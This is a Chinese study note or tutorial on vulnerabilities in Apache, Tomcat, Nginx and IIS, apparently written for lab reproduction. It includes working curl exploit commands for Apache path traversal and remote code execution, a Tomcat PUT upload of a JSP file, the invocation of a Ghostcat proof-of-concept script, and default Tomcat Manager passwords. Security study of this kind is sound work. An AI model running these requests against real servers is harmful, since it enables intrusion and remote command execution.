---
title: "中间件安全：Apache、Tomcat、Nginx、IIS"
pubDate: 2026-08-04
tags:
  - 安全
  - 中间件
---

中间件是承载业务的服务组件（Apache/Tomcat/Nginx/IIS），漏洞来自版本 CVE、默认配置、管理后台暴露、危险方法（PUT）、特殊协议（AJP）、解析差异。和 SQL 注入/XSS 不同，依赖服务版本和部署习惯

## Apache CVE-2021-41773（路径穿越/CGI RCE）

2.4.49 路径规范化缺陷，`.%2e` 构造穿越读 Web 根外文件，CGI 开可 RCE

```
curl -s --path-as-is "http://目标:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
curl -s --path-as-is --data "echo;id" "http://目标:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
```

## Apache CVE-2021-42013（双重编码绕过）

2.4.50 对 41773 修复不完整，双重编码绕过

```
curl -s --path-as-is "http://目标:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"
curl -s --path-as-is --data "echo;id" "http://目标:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
```

## Tomcat CVE-2017-12615（PUT 任意文件写入）

DefaultServlet `readonly=false` + 允许 PUT，能写 JSP

```
curl -X PUT --data-binary "@ok.jsp" "http://目标:8080/ok.jsp/"
curl "http://目标:8080/ok.jsp"
```

ok.jsp 内容 `<% out.println("tomcat-put-ok"); %>`，访问返回该字符串即成功

## Tomcat CVE-2020-1938 Ghostcat（AJP 文件读取）

AJP 协议暴露可读 WEB-INF 下文件。Vulhub 自带 poc.py：

```
docker run --rm -v "$PWD:/work" -w /work python:2.7 python poc.py host -p 8009 -f WEB-INF/web.xml
```

## Tomcat Manager 弱口令

入口 `/manager/html`，链路：后台暴露→弱口令→传 WAR 包→部署 getshell。弱口令 `tomcat/tomcat`、`admin/admin`

## Nginx

风险多来自配置错误：alias 路径拼接穿越、反代暴露内网、PHP 解析错误、CVE-2021-23017（DNS resolver，偏 DoS，本地复现难）。版本识别 `curl -I` 看 Server 头

## IIS

短文件名泄露、解析漏洞（IIS6.0）、WebDAV PUT 写入、目录权限配置、ASP/ASPX 上传解析

## 要点

中间件漏洞不来自业务参数，来自版本/默认配置/危险模块/暴露端口/管理后台/解析规则。排查顺序：识别类型→版本号→查 CVE→查危险端口（AJP 8009）→查危险方法（PUT）→查管理后台→查弱口令→查解析差异
